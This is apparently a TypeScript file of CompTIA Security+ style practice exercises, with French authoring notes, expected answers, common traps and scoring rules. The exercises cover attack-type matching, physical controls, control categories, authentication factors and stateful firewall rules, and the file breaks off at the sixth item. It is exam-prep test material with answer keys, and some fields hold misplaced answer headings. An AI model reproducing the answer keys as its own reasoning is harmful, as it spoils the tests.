import type { ScenarioTasksPBQ } from './pbq';

export const importedPbqExercises = [
  {
    "id": "messer-scenario-001",
    "domain": "Threats, Vulnerabilities, and Mitigations",
    "type": "scenario_tasks",
    "title": "Matching \"description \u2192 attaque\"",
    "difficulty": "simulation",
    "timeLimitSeconds": 300,
    "role": "Security+ Candidate",
    "scenario": "1. Mod\u00e8le Messer PBQ - Matching \"description \u2192 attaque\"\nInspiration Messer\n\nDans l'examen A, un PBQ demande d'associer des descriptions d'actions attaquantes \u00e0 des types d'attaques. Les options incluent des attaques comme on-path, keylogger, vishing, DDoS, injection, etc.\n\nObjectif p\u00e9dagogique\n\nTester si l'\u00e9tudiant reconna\u00eet une attaque \u00e0 partir d'un comportement observable, pas seulement \u00e0 partir du nom.\n\nInterface \u00e0 reproduire\n\nType : drag-and-drop / matching\n\nDescription c\u00f4t\u00e9 gauche\n\u2193\nListe d\u00e9roulante Attack Type c\u00f4t\u00e9 droit\nStructure UI\nDescription\tAttack Type\nA malicious actor intercepts communication between a user and a website\tDropdown\nAn attacker obtains credentials by recording keystrokes\tDropdown\nA caller tricks a victim into revealing banking information\tDropdown\nMany systems overwhelm a public service\tDropdown\nBanque d'options\nOn-path attack\nKeylogger\nVishing\nDDoS\nInjection\nSupply chain attack\nRootkit\nRFID cloning",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "Messer PBQs local import",
    "skills": [
      "2.4"
    ],
    "tasks": [
      {
        "id": "messer-scenario-001-task-1",
        "kind": "matching",
        "title": "Matching \"description \u2192 attaque\"",
        "prompt": "1. Mod\u00e8le Messer PBQ - Matching \"description \u2192 attaque\"\nInspiration Messer\n\nDans l'examen A, un PBQ demande d'associer des descriptions d'actions attaquantes \u00e0 des types d'attaques. Les options incluent des attaques comme on-path, keylogger, vishing, DDoS, injection, etc.\n\nObjectif p\u00e9dagogique\n\nTester si l'\u00e9tudiant reconna\u00eet une attaque \u00e0 partir d'un comportement observable, pas seulement \u00e0 partir du nom.\n\nInterface \u00e0 reproduire\n\nType : drag-and-drop / matching\n\nDescription c\u00f4t\u00e9 gauche\n\u2193\nListe d\u00e9roulante Attack Type c\u00f4t\u00e9 droit\nStructure UI\nDescription\tAttack Type\nA malicious actor intercepts communication between a user and a website\tDropdown\nAn attacker obtains credentials by recording keystrokes\tDropdown\nA caller tricks a victim into revealing banking information\tDropdown\nMany systems overwhelm a public service\tDropdown\nBanque d'options\nOn-path attack\nKeylogger\nVishing\nDDoS\nInjection\nSupply chain attack\nRootkit\nRFID cloning",
        "options": [],
        "expectedAnswers": [
          "Indice dans la description\tR\u00e9ponse attendue",
          "Intercepts communication\tOn-path attack",
          "Records keystrokes\tKeylogger",
          "Voice call / phone call\tVishing",
          "Many attackers overwhelm service\tDDoS",
          "Adds code/input to access database\tInjection",
          "Malicious vendor/update/dependency\tSupply chain",
          "Hidden malware in OS\tRootkit",
          "Copies wireless card/badge data\tRFID cloning",
          "R\u00e8gle de g\u00e9n\u00e9ration automatique",
          "Pour ton app, chaque item doit avoir :",
          "{",
          "\"description\": \"An attacker records every key typed by a user.\",",
          "\"correctAnswer\": \"Keylogger\",",
          "\"distractors\": [\"Rootkit\", \"DDoS\", \"On-path attack\"],",
          "\"testedSkill\": \"Recognize malicious activity indicators\",",
          "\"domain\": \"2.4\"",
          "}"
        ],
        "explanation": "1. Mod\u00e8le Messer PBQ - Matching \"description \u2192 attaque\"\nInspiration Messer\n\nDans l'examen A, un PBQ demande d'associer des descriptions d'actions attaquantes \u00e0 des types d'attaques. Les options incluent des attaques comme on-path, keylogger, vishing, DDoS, injection, etc.\n\nObjectif p\u00e9dagogique\n\nTester si l'\u00e9tudiant reconna\u00eet une attaque \u00e0 partir d'un comportement observable, pas seulement \u00e0 partir du nom.\n\nInterface \u00e0 reproduire\n\nType : drag-and-drop / matching\n\nDescription c\u00f4t\u00e9 gauche\n\u2193\nListe d\u00e9roulante Attack Type c\u00f4t\u00e9 droit\nStructure UI\nDescription\tAttack Type\nA malicious actor intercepts communication between a user and a website\tDropdown\nAn attacker obtains credentials by recording keystrokes\tDropdown\nA caller tricks a victim into revealing banking information\tDropdown\nMany systems overwhelm a public service\tDropdown\nBanque d'options\nOn-path attack\nKeylogger\nVishing\nDDoS\nInjection\nSupply chain attack\nRootkit\nRFID cloning\nR\u00e9ponses attendues\nIndice dans la description\tR\u00e9ponse attendue\nIntercepts communication\tOn-path attack\nRecords keystrokes\tKeylogger\nVoice call / phone call\tVishing\nMany attackers overwhelm service\tDDoS\nAdds code/input to access database\tInjection\nMalicious vendor/update/dependency\tSupply chain\nHidden malware in OS\tRootkit\nCopies wireless card/badge data\tRFID cloning\nR\u00e8gle de g\u00e9n\u00e9ration automatique\n\nPour ton app, chaque item doit avoir :\n\n{\n  \"description\": \"An attacker records every key typed by a user.\",\n  \"correctAnswer\": \"Keylogger\",\n  \"distractors\": [\"Rootkit\", \"DDoS\", \"On-path attack\"],\n  \"testedSkill\": \"Recognize malicious activity indicators\",\n  \"domain\": \"2.4\"\n}\nScoring\nCrit\u00e8re\tPoints\nChaque association correcte\t+1\nMauvaise association\t0\nScore partiel autoris\u00e9\tOui\nPi\u00e8ges \u00e0 int\u00e9grer\nPi\u00e8ge\tExplication\nOn-path vs replay\tOn-path intercepte ; replay r\u00e9utilise une capture.\nVishing vs phishing\tVishing = voix/appel ; phishing = email/message.\nInjection vs XSS\tInjection est plus g\u00e9n\u00e9ral ; XSS est une injection script c\u00f4t\u00e9 navigateur.\nRootkit vs keylogger\tRootkit cache ; keylogger capture frappes.",
        "traps": [
          "Pi\u00e8ge\tExplication",
          "On-path vs replay\tOn-path intercepte ; replay r\u00e9utilise une capture.",
          "Vishing vs phishing\tVishing = voix/appel ; phishing = email/message.",
          "Injection vs XSS\tInjection est plus g\u00e9n\u00e9ral ; XSS est une injection script c\u00f4t\u00e9 navigateur.",
          "Rootkit vs keylogger\tRootkit cache ; keylogger capture frappes."
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "messer-scenario-002",
    "domain": "Security Architecture",
    "type": "scenario_tasks",
    "title": "S\u00e9lection du meilleur contr\u00f4le par emplacement",
    "difficulty": "simulation",
    "timeLimitSeconds": 420,
    "role": "Security+ Candidate",
    "scenario": "You are creating physical security standards for a company headquarters. Select the BEST security control for each location. Each control is used once.\n\nContr\u00f4les disponibles\nSecurity guard\nAccess badge\nLighting\nAccess control vestibule\nFencing\nBiometrics\nAuthentication token\nVideo surveillance\nEmplacements\nLocation / Requirement\tSelected control\nVisitor reception desk\tDropdown\nParking lot at night\tDropdown\nOuter perimeter\tDropdown\nData center entrance to prevent tailgating\tDropdown\nEmployee entrance door\tDropdown\nServer console requiring strong human verification\tDropdown\nRemote admin login requiring something you have\tDropdown\nMonitoring hallway activity\tDropdown",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "Messer PBQs local import",
    "skills": [],
    "tasks": [
      {
        "id": "messer-scenario-002-task-1",
        "kind": "table_completion",
        "title": "S\u00e9lection du meilleur contr\u00f4le par emplacement",
        "prompt": "You are creating physical security standards for a company headquarters. Select the BEST security control for each location. Each control is used once.\n\nContr\u00f4les disponibles\nSecurity guard\nAccess badge\nLighting\nAccess control vestibule\nFencing\nBiometrics\nAuthentication token\nVideo surveillance\nEmplacements\nLocation / Requirement\tSelected control\nVisitor reception desk\tDropdown\nParking lot at night\tDropdown\nOuter perimeter\tDropdown\nData center entrance to prevent tailgating\tDropdown\nEmployee entrance door\tDropdown\nServer console requiring strong human verification\tDropdown\nRemote admin login requiring something you have\tDropdown\nMonitoring hallway activity\tDropdown",
        "options": [
          "Security guard",
          "Access badge",
          "Lighting",
          "Access control vestibule",
          "Fencing",
          "Biometrics",
          "Authentication token",
          "Video surveillance",
          "Emplacements",
          "Location / Requirement\tSelected control",
          "Visitor reception desk\tDropdown",
          "Parking lot at night\tDropdown",
          "Outer perimeter\tDropdown",
          "Data center entrance to prevent tailgating\tDropdown",
          "Employee entrance door\tDropdown",
          "Server console requiring strong human verification\tDropdown",
          "Remote admin login requiring something you have\tDropdown",
          "Monitoring hallway activity\tDropdown",
          "R\u00e9ponses attendues",
          "Besoin\tMeilleur contr\u00f4le"
        ],
        "expectedAnswers": [
          "Besoin\tMeilleur contr\u00f4le",
          "Visitor identity verification\tSecurity guard",
          "Night deterrence\tLighting",
          "Perimeter boundary\tFencing",
          "Prevent tailgating\tAccess control vestibule",
          "Employee door access\tAccess badge",
          "Unique human characteristic\tBiometrics",
          "Something you have\tAuthentication token",
          "Monitoring activity\tVideo surveillance",
          "Pourquoi c'est proche Messer",
          "Le style est identique : une liste de contr\u00f4les, plusieurs emplacements, et l'\u00e9tudiant doit choisir le BEST security control. Le test porte sur les contr\u00f4les physiques list\u00e9s officiellement dans les objectifs SY0-701 : fencing, access control vestibule, video surveillance, security guard, access badge, lighting et sensors."
        ],
        "explanation": "2. Mod\u00e8le Messer PBQ - S\u00e9lection du meilleur contr\u00f4le par emplacement\nInspiration Messer\n\nDans l'examen A, un PBQ demande de choisir le meilleur contr\u00f4le de s\u00e9curit\u00e9 pour diff\u00e9rents emplacements physiques ou usages : parking, r\u00e9ception, porte de data center, console serveur, etc. Les contr\u00f4les disponibles incluent notamment security guard, access badge, lighting, access control vestibule, fencing, biometrics.\n\nObjectif p\u00e9dagogique\n\nTester la compr\u00e9hension de :\n\ns\u00e9curit\u00e9 physique ;\ncontr\u00f4le op\u00e9rationnel vs physique ;\ncontr\u00f4le d'acc\u00e8s ;\ndissuasion ;\nauthentification forte.\nInterface \u00e0 reproduire\n\nType : drag-and-drop\n\nContr\u00f4les disponibles en haut\n\u2193\nCases \u00e0 remplir par emplacement\nExemple reproductible original\nPrompt\n\nYou are creating physical security standards for a company headquarters. Select the BEST security control for each location. Each control is used once.\n\nContr\u00f4les disponibles\nSecurity guard\nAccess badge\nLighting\nAccess control vestibule\nFencing\nBiometrics\nAuthentication token\nVideo surveillance\nEmplacements\nLocation / Requirement\tSelected control\nVisitor reception desk\tDropdown\nParking lot at night\tDropdown\nOuter perimeter\tDropdown\nData center entrance to prevent tailgating\tDropdown\nEmployee entrance door\tDropdown\nServer console requiring strong human verification\tDropdown\nRemote admin login requiring something you have\tDropdown\nMonitoring hallway activity\tDropdown\nR\u00e9ponses attendues\nBesoin\tMeilleur contr\u00f4le\nVisitor identity verification\tSecurity guard\nNight deterrence\tLighting\nPerimeter boundary\tFencing\nPrevent tailgating\tAccess control vestibule\nEmployee door access\tAccess badge\nUnique human characteristic\tBiometrics\nSomething you have\tAuthentication token\nMonitoring activity\tVideo surveillance\nPourquoi c'est proche Messer\n\nLe style est identique : une liste de contr\u00f4les, plusieurs emplacements, et l'\u00e9tudiant doit choisir le BEST security control. Le test porte sur les contr\u00f4les physiques list\u00e9s officiellement dans les objectifs SY0-701 : fencing, access control vestibule, video surveillance, security guard, access badge, lighting et sensors.\n\nScoring\n\u00c9l\u00e9ment\tPoints\nContr\u00f4le exact\t+10\nContr\u00f4le acceptable mais pas optimal\t+5\nContr\u00f4le hors sujet\t0\nPi\u00e8ges \u00e0 int\u00e9grer\nMauvais choix\tPourquoi c'est un pi\u00e8ge\nSecurity guard = physical uniquement\tDans CompTIA, l'humain qui applique une r\u00e8gle est souvent operational.\nBadge pour emp\u00eacher tailgating\tUn badge seul n'emp\u00eache pas deux personnes d'entrer ensemble.\nCamera pour emp\u00eacher acc\u00e8s\tCam\u00e9ra d\u00e9tecte/enregistre, mais ne bloque pas.\nLighting comme detective\tLighting est surtout deterrent.",
        "traps": [
          "Mauvais choix\tPourquoi c'est un pi\u00e8ge",
          "Security guard = physical uniquement\tDans CompTIA, l'humain qui applique une r\u00e8gle est souvent operational.",
          "Badge pour emp\u00eacher tailgating\tUn badge seul n'emp\u00eache pas deux personnes d'entrer ensemble.",
          "Camera pour emp\u00eacher acc\u00e8s\tCam\u00e9ra d\u00e9tecte/enregistre, mais ne bloque pas.",
          "Lighting comme detective\tLighting est surtout deterrent."
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "messer-scenario-003",
    "domain": "Security Operations",
    "type": "scenario_tasks",
    "title": "Cat\u00e9gorie de contr\u00f4le",
    "difficulty": "simulation",
    "timeLimitSeconds": 300,
    "role": "Security+ Candidate",
    "scenario": "3. Mod\u00e8le Messer PBQ - Cat\u00e9gorie de contr\u00f4le\nInspiration Messer\n\nDans l'examen A, un PBQ demande de s\u00e9lectionner la cat\u00e9gorie de s\u00e9curit\u00e9 la plus appropri\u00e9e : Technical, Managerial, Operational, Physical. Les sc\u00e9narios incluent des exemples comme v\u00e9rification d'identit\u00e9 par un garde, approbation par un vice-pr\u00e9sident, g\u00e9n\u00e9rateur \u00e9lectrique, access card, logs envoy\u00e9s vers un SIEM.\n\nObjectif p\u00e9dagogique\n\nTester les cat\u00e9gories de contr\u00f4les, pas les types.\n\nInterface\n\nType : matching / classification\n\nColonnes :\n\nTechnical | Managerial | Operational | Physical\n\n\u00c9l\u00e9ments \u00e0 glisser :\n\nFirewall rule\nSecurity policy approval\nSecurity guard badge check\nGenerator\nSIEM log forwarding\nDoor lock\nAwareness training\nRisk assessment",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "Messer PBQs local import",
    "skills": [],
    "tasks": [
      {
        "id": "messer-scenario-003-task-1",
        "kind": "classification",
        "title": "Cat\u00e9gorie de contr\u00f4le",
        "prompt": "3. Mod\u00e8le Messer PBQ - Cat\u00e9gorie de contr\u00f4le\nInspiration Messer\n\nDans l'examen A, un PBQ demande de s\u00e9lectionner la cat\u00e9gorie de s\u00e9curit\u00e9 la plus appropri\u00e9e : Technical, Managerial, Operational, Physical. Les sc\u00e9narios incluent des exemples comme v\u00e9rification d'identit\u00e9 par un garde, approbation par un vice-pr\u00e9sident, g\u00e9n\u00e9rateur \u00e9lectrique, access card, logs envoy\u00e9s vers un SIEM.\n\nObjectif p\u00e9dagogique\n\nTester les cat\u00e9gories de contr\u00f4les, pas les types.\n\nInterface\n\nType : matching / classification\n\nColonnes :\n\nTechnical | Managerial | Operational | Physical\n\n\u00c9l\u00e9ments \u00e0 glisser :\n\nFirewall rule\nSecurity policy approval\nSecurity guard badge check\nGenerator\nSIEM log forwarding\nDoor lock\nAwareness training\nRisk assessment",
        "options": [],
        "expectedAnswers": [
          "\u00c9l\u00e9ment\tCat\u00e9gorie",
          "Firewall rule\tTechnical",
          "SIEM log forwarding\tTechnical",
          "Security policy approval\tManagerial",
          "Risk assessment\tManagerial",
          "Security guard badge check\tOperational",
          "Awareness training\tOperational",
          "Door lock\tPhysical",
          "Generator\tPhysical"
        ],
        "explanation": "3. Mod\u00e8le Messer PBQ - Cat\u00e9gorie de contr\u00f4le\nInspiration Messer\n\nDans l'examen A, un PBQ demande de s\u00e9lectionner la cat\u00e9gorie de s\u00e9curit\u00e9 la plus appropri\u00e9e : Technical, Managerial, Operational, Physical. Les sc\u00e9narios incluent des exemples comme v\u00e9rification d'identit\u00e9 par un garde, approbation par un vice-pr\u00e9sident, g\u00e9n\u00e9rateur \u00e9lectrique, access card, logs envoy\u00e9s vers un SIEM.\n\nObjectif p\u00e9dagogique\n\nTester les cat\u00e9gories de contr\u00f4les, pas les types.\n\nInterface\n\nType : matching / classification\n\nColonnes :\n\nTechnical | Managerial | Operational | Physical\n\n\u00c9l\u00e9ments \u00e0 glisser :\n\nFirewall rule\nSecurity policy approval\nSecurity guard badge check\nGenerator\nSIEM log forwarding\nDoor lock\nAwareness training\nRisk assessment\nR\u00e9ponses attendues\n\u00c9l\u00e9ment\tCat\u00e9gorie\nFirewall rule\tTechnical\nSIEM log forwarding\tTechnical\nSecurity policy approval\tManagerial\nRisk assessment\tManagerial\nSecurity guard badge check\tOperational\nAwareness training\tOperational\nDoor lock\tPhysical\nGenerator\tPhysical\nR\u00e8gle de g\u00e9n\u00e9ration\n{\n  \"item\": \"System logs are automatically forwarded to a SIEM.\",\n  \"correctCategory\": \"Technical\",\n  \"trap\": \"Some students choose operational because logs support operations.\"\n}\nPi\u00e8ges\nConfusion\tCorrection\nTechnical vs Operational\tSi c'est automatis\u00e9 par syst\u00e8me : technical.\nOperational vs Physical\tSi une personne agit : operational.\nManagerial vs Directive\tUne policy peut \u00eatre managerial par cat\u00e9gorie et directive par type.\nGenerator\tPhysique, car \u00e9quipement mat\u00e9riel pour availability.",
        "traps": [
          "Confusion\tCorrection",
          "Technical vs Operational\tSi c'est automatis\u00e9 par syst\u00e8me : technical.",
          "Operational vs Physical\tSi une personne agit : operational.",
          "Managerial vs Directive\tUne policy peut \u00eatre managerial par cat\u00e9gorie et directive par type.",
          "Generator\tPhysique, car \u00e9quipement mat\u00e9riel pour availability."
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "messer-scenario-004",
    "domain": "General Security Concepts",
    "type": "scenario_tasks",
    "title": "Authentication factors",
    "difficulty": "simulation",
    "timeLimitSeconds": 300,
    "role": "Security+ Candidate",
    "scenario": "4. Mod\u00e8le Messer PBQ - Authentication factors\nInspiration Messer\n\nDans l'examen A, un PBQ demande d'associer une description au facteur d'authentification : somewhere you are, something you have, something you are, something you know.\n\nObjectif p\u00e9dagogique\n\nTester les facteurs d'authentification.\n\nInterface\n\nType : matching\n\nDescription\tAuthentication factor\nUser enters a PIN\tDropdown\nUser unlocks door with fingerprint\tDropdown\nUser receives one-time code on phone\tDropdown\nLogin only works from corporate VPN/geolocation\tDropdown",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "Messer PBQs local import",
    "skills": [],
    "tasks": [
      {
        "id": "messer-scenario-004-task-1",
        "kind": "matching",
        "title": "Authentication factors",
        "prompt": "4. Mod\u00e8le Messer PBQ - Authentication factors\nInspiration Messer\n\nDans l'examen A, un PBQ demande d'associer une description au facteur d'authentification : somewhere you are, something you have, something you are, something you know.\n\nObjectif p\u00e9dagogique\n\nTester les facteurs d'authentification.\n\nInterface\n\nType : matching\n\nDescription\tAuthentication factor\nUser enters a PIN\tDropdown\nUser unlocks door with fingerprint\tDropdown\nUser receives one-time code on phone\tDropdown\nLogin only works from corporate VPN/geolocation\tDropdown",
        "options": [],
        "expectedAnswers": [
          "Description\tFacteur",
          "PIN/password\tSomething you know",
          "Token, phone, smart card\tSomething you have",
          "Fingerprint, face, iris\tSomething you are",
          "Location, GPS, network location\tSomewhere you are",
          "Variante \u00e0 g\u00e9n\u00e9rer dans ton app",
          "{",
          "\"type\": \"auth_factor_matching\",",
          "\"items\": [",
          "\"description\": \"The user authenticates with a smart card.\",",
          "\"answer\": \"Something you have\"",
          "},",
          "\"description\": \"The user authenticates with facial recognition.\",",
          "\"answer\": \"Something you are\"",
          "}",
          "]"
        ],
        "explanation": "4. Mod\u00e8le Messer PBQ - Authentication factors\nInspiration Messer\n\nDans l'examen A, un PBQ demande d'associer une description au facteur d'authentification : somewhere you are, something you have, something you are, something you know.\n\nObjectif p\u00e9dagogique\n\nTester les facteurs d'authentification.\n\nInterface\n\nType : matching\n\nDescription\tAuthentication factor\nUser enters a PIN\tDropdown\nUser unlocks door with fingerprint\tDropdown\nUser receives one-time code on phone\tDropdown\nLogin only works from corporate VPN/geolocation\tDropdown\nR\u00e9ponses attendues\nDescription\tFacteur\nPIN/password\tSomething you know\nToken, phone, smart card\tSomething you have\nFingerprint, face, iris\tSomething you are\nLocation, GPS, network location\tSomewhere you are\nVariante \u00e0 g\u00e9n\u00e9rer dans ton app\n{\n  \"type\": \"auth_factor_matching\",\n  \"items\": [\n    {\n      \"description\": \"The user authenticates with a smart card.\",\n      \"answer\": \"Something you have\"\n    },\n    {\n      \"description\": \"The user authenticates with facial recognition.\",\n      \"answer\": \"Something you are\"\n    }\n  ]\n}\nPi\u00e8ges\nPi\u00e8ge\tExplication\nPassword + PIN = MFA\tFaux : ce sont deux \u00e9l\u00e9ments du m\u00eame facteur \"something you know\".\nSMS OTP = something you know\tFaux : le t\u00e9l\u00e9phone/code re\u00e7u est g\u00e9n\u00e9ralement \"something you have\".\nBiometrics = username\tFaux : biom\u00e9trie = \"something you are\".",
        "traps": [
          "Pi\u00e8ge\tExplication",
          "Password + PIN = MFA\tFaux : ce sont deux \u00e9l\u00e9ments du m\u00eame facteur \"something you know\".",
          "SMS OTP = something you know\tFaux : le t\u00e9l\u00e9phone/code re\u00e7u est g\u00e9n\u00e9ralement \"something you have\".",
          "Biometrics = username\tFaux : biom\u00e9trie = \"something you are\"."
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "messer-scenario-005",
    "domain": "Security Architecture",
    "type": "scenario_tasks",
    "title": "Stateful firewall rules avec topologie",
    "difficulty": "simulation",
    "timeLimitSeconds": 420,
    "role": "Security+ Candidate",
    "scenario": "Configure the following stateful firewall rules:\n\nBlock HTTP traffic from the DMZ Web Server to the Internal Database Server.\nAllow the Internal Backup Server to transfer files to the DMZ File Server using SFTP.\nAllow the Management Server to use a secure terminal on the DMZ Web Server.\nDonn\u00e9es\nDevice\tZone\tIP\nDMZ Web Server\tDMZ\t172.16.10.10\nDMZ File Server\tDMZ\t172.16.10.20\nInternal Database Server\tInternal\t10.10.20.30\nInternal Backup Server\tInternal\t10.10.30.40\nManagement Server\tInternal\t10.10.50.25\nR\u00e9ponse attendue\nRule\tSource\tDestination\tProtocol\tPort\tAction\n1\t172.16.10.10\t10.10.20.30\tTCP\t80\tBlock\n2\t10.10.30.40\t172.16.10.20\tTCP\t22\tAllow\n3\t10.10.50.25\t172.16.10.10\tTCP\t22\tAllow\nLogique de correction automatique\n{\n  \"stateful\": true,\n  \"expectedRules\": [\n    {\n      \"source\": \"172.16.10.10\",\n      \"destination\": \"10.10.20.30\",\n      \"protocol\": \"TCP\",\n      \"port\": 80,\n      \"action\": \"Block\"\n    },\n    {\n      \"source\": \"10.10.30.40\",\n      \"destination\": \"172.16.10.20\",\n      \"protocol\": \"TCP\",\n      \"port\": 22,\n      \"action\": \"Allow\"\n    },\n    {\n      \"source\": \"10.10.50.25\",\n      \"destination\": \"172.16.10.10\",\n      \"protocol\": \"TCP\",\n      \"port\": 22,\n      \"action\": \"Allow\"\n    }\n  ],\n  \"penalties\": [\n    {\n      \"condition\": \"reverse_rule_added\",\n      \"points\": -10,\n      \"message\": \"A stateful firewall does not need a separate return rule.\"\n    },\n    {\n      \"condition\": \"wrong_source_destination\",\n      \"points\": -15,\n      \"message\": \"The source and destination are reversed.\"\n    }\n  ]\n}\nPi\u00e8ges \u00e0 int\u00e9grer\nPi\u00e8ge\tPourquoi\nSFTP = 443\tFaux : SFTP utilise SSH/TCP 22.\nSecure terminal = Telnet\tFaux : secure terminal = SSH/TCP 22.\nAjouter r\u00e8gle retour\tInutile sur firewall stateful.\nConfondre direction DMZ \u2192 Internal\tLa source est toujours l'\u00e9metteur initial du flux.\nHTTP = UDP 80\tHTTP = TCP 80.",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "Messer PBQs local import",
    "skills": [],
    "tasks": [
      {
        "id": "messer-scenario-005-task-1",
        "kind": "table_completion",
        "title": "Stateful firewall rules avec topologie",
        "prompt": "Configure the following stateful firewall rules:\n\nBlock HTTP traffic from the DMZ Web Server to the Internal Database Server.\nAllow the Internal Backup Server to transfer files to the DMZ File Server using SFTP.\nAllow the Management Server to use a secure terminal on the DMZ Web Server.\nDonn\u00e9es\nDevice\tZone\tIP\nDMZ Web Server\tDMZ\t172.16.10.10\nDMZ File Server\tDMZ\t172.16.10.20\nInternal Database Server\tInternal\t10.10.20.30\nInternal Backup Server\tInternal\t10.10.30.40\nManagement Server\tInternal\t10.10.50.25\nR\u00e9ponse attendue\nRule\tSource\tDestination\tProtocol\tPort\tAction\n1\t172.16.10.10\t10.10.20.30\tTCP\t80\tBlock\n2\t10.10.30.40\t172.16.10.20\tTCP\t22\tAllow\n3\t10.10.50.25\t172.16.10.10\tTCP\t22\tAllow\nLogique de correction automatique\n{\n  \"stateful\": true,\n  \"expectedRules\": [\n    {\n      \"source\": \"172.16.10.10\",\n      \"destination\": \"10.10.20.30\",\n      \"protocol\": \"TCP\",\n      \"port\": 80,\n      \"action\": \"Block\"\n    },\n    {\n      \"source\": \"10.10.30.40\",\n      \"destination\": \"172.16.10.20\",\n      \"protocol\": \"TCP\",\n      \"port\": 22,\n      \"action\": \"Allow\"\n    },\n    {\n      \"source\": \"10.10.50.25\",\n      \"destination\": \"172.16.10.10\",\n      \"protocol\": \"TCP\",\n      \"port\": 22,\n      \"action\": \"Allow\"\n    }\n  ],\n  \"penalties\": [\n    {\n      \"condition\": \"reverse_rule_added\",\n      \"points\": -10,\n      \"message\": \"A stateful firewall does not need a separate return rule.\"\n    },\n    {\n      \"condition\": \"wrong_source_destination\",\n      \"points\": -15,\n      \"message\": \"The source and destination are reversed.\"\n    }\n  ]\n}\nPi\u00e8ges \u00e0 int\u00e9grer\nPi\u00e8ge\tPourquoi\nSFTP = 443\tFaux : SFTP utilise SSH/TCP 22.\nSecure terminal = Telnet\tFaux : secure terminal = SSH/TCP 22.\nAjouter r\u00e8gle retour\tInutile sur firewall stateful.\nConfondre direction DMZ \u2192 Internal\tLa source est toujours l'\u00e9metteur initial du flux.\nHTTP = UDP 80\tHTTP = TCP 80.",
        "options": [],
        "expectedAnswers": [],
        "explanation": "5. Mod\u00e8le Messer PBQ - Stateful firewall rules avec topologie\nInspiration Messer\n\nDans l'examen A, un PBQ demande de configurer des r\u00e8gles firewall stateful entre des serveurs en DMZ et r\u00e9seau interne, avec un tableau Source IP / Destination IP / Protocol / Port / Allow-Block. Le corrig\u00e9 insiste sur le fait qu'un stateful firewall n'a pas besoin de r\u00e8gle retour s\u00e9par\u00e9e pour le trafic de r\u00e9ponse.\n\nObjectif p\u00e9dagogique\n\nTester :\n\nlecture d'une topologie ;\nports/protocoles ;\nsource/destination ;\nallow/block ;\nstateful firewall ;\nleast privilege.\nInterface \u00e0 reproduire\nTopologie visuelle\nInternet\n   |\nFirewall\n   |\nDMZ Switch\n   |---- Web Server\n   |---- File Server\n   |---- Video Server\n\nInternal Switch\n   |---- Database Server\n   |---- Storage Server\n   |---- Management Server\nTable \u00e0 remplir\nRule #\tSource IP\tDestination IP\tProtocol\tPort\tAction\n1\tinput/dropdown\tinput/dropdown\tTCP/UDP\tinput\tAllow/Block\n2\tinput/dropdown\tinput/dropdown\tTCP/UDP\tinput\tAllow/Block\n3\tinput/dropdown\tinput/dropdown\tTCP/UDP\tinput\tAllow/Block\nPrompt original reproductible\n\nConfigure the following stateful firewall rules:\n\nBlock HTTP traffic from the DMZ Web Server to the Internal Database Server.\nAllow the Internal Backup Server to transfer files to the DMZ File Server using SFTP.\nAllow the Management Server to use a secure terminal on the DMZ Web Server.\nDonn\u00e9es\nDevice\tZone\tIP\nDMZ Web Server\tDMZ\t172.16.10.10\nDMZ File Server\tDMZ\t172.16.10.20\nInternal Database Server\tInternal\t10.10.20.30\nInternal Backup Server\tInternal\t10.10.30.40\nManagement Server\tInternal\t10.10.50.25\nR\u00e9ponse attendue\nRule\tSource\tDestination\tProtocol\tPort\tAction\n1\t172.16.10.10\t10.10.20.30\tTCP\t80\tBlock\n2\t10.10.30.40\t172.16.10.20\tTCP\t22\tAllow\n3\t10.10.50.25\t172.16.10.10\tTCP\t22\tAllow\nLogique de correction automatique\n{\n  \"stateful\": true,\n  \"expectedRules\": [\n    {\n      \"source\": \"172.16.10.10\",\n      \"destination\": \"10.10.20.30\",\n      \"protocol\": \"TCP\",\n      \"port\": 80,\n      \"action\": \"Block\"\n    },\n    {\n      \"source\": \"10.10.30.40\",\n      \"destination\": \"172.16.10.20\",\n      \"protocol\": \"TCP\",\n      \"port\": 22,\n      \"action\": \"Allow\"\n    },\n    {\n      \"source\": \"10.10.50.25\",\n      \"destination\": \"172.16.10.10\",\n      \"protocol\": \"TCP\",\n      \"port\": 22,\n      \"action\": \"Allow\"\n    }\n  ],\n  \"penalties\": [\n    {\n      \"condition\": \"reverse_rule_added\",\n      \"points\": -10,\n      \"message\": \"A stateful firewall does not need a separate return rule.\"\n    },\n    {\n      \"condition\": \"wrong_source_destination\",\n      \"points\": -15,\n      \"message\": \"The source and destination are reversed.\"\n    }\n  ]\n}\nPi\u00e8ges \u00e0 int\u00e9grer\nPi\u00e8ge\tPourquoi\nSFTP = 443\tFaux : SFTP utilise SSH/TCP 22.\nSecure terminal = Telnet\tFaux : secure terminal = SSH/TCP 22.\nAjouter r\u00e8gle retour\tInutile sur firewall stateful.\nConfondre direction DMZ \u2192 Internal\tLa source est toujours l'\u00e9metteur initial du flux.\nHTTP = UDP 80\tHTTP = TCP 80.",
        "traps": [
          "Pi\u00e8ge\tPourquoi",
          "SFTP = 443\tFaux : SFTP utilise SSH/TCP 22.",
          "Secure terminal = Telnet\tFaux : secure terminal = SSH/TCP 22.",
          "Ajouter r\u00e8gle retour\tInutile sur firewall stateful.",
          "Confondre direction DMZ \u2192 Internal\tLa source est toujours l'\u00e9metteur initial du flux.",
          "HTTP = UDP 80\tHTTP = TCP 80."
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "messer-scenario-006",
